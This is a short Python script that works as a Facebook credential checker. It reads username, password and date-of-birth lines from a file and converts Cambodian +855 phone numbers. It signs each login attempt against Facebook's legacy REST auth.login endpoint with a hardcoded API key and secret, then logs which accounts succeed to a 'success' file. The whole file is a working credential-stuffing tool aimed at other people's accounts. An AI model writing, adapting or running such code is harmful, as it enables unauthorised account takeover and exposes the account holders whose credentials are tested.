import json , hashlib ,requests

f=open("fb.txt","r")
#textfb=f.readlines()
#username=str.strip(line, "#")
#password=str.strip(line, "#",2)
out = open('success/fsuccess.txt','w')
for line in f:
	fb			= line.split('#')
	username	= fb[0]
	password 	= fb[1]
	dob			= fb[2]
	#fix phone number - contrycode
	if '+855' in password:
		password = password.replace('+855','0')
	print("[*]<<"+username+">>");
	id = username
	pwd = password
	API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';
	data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};
	sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
	x = hashlib.new('md5')
	x.update(sig)
	data.update({'sig':x.hexdigest()})

	r = requests.get('https://api.facebook.com/restserver.php',params=data)
	a = json.loads(r.text)
	print(a)
	loginsuccess = "success"
	if 'error_data' in a:
		errordata = json.dumps(a['error_data'])
		errorsmg = errordata[errordata.find('error_title')+16:errordata.find('error_message')-5]
		out.write(username + '#' + password + '#' + dob + '#' + errorsmg +'\n')
		print(errorsmg)
	else:
	    out.write(username + '#' + password + '#' + dob.rstrip() + '#' + loginsuccess +'\n')
	    print(loginsuccess)
out.close()
f.close()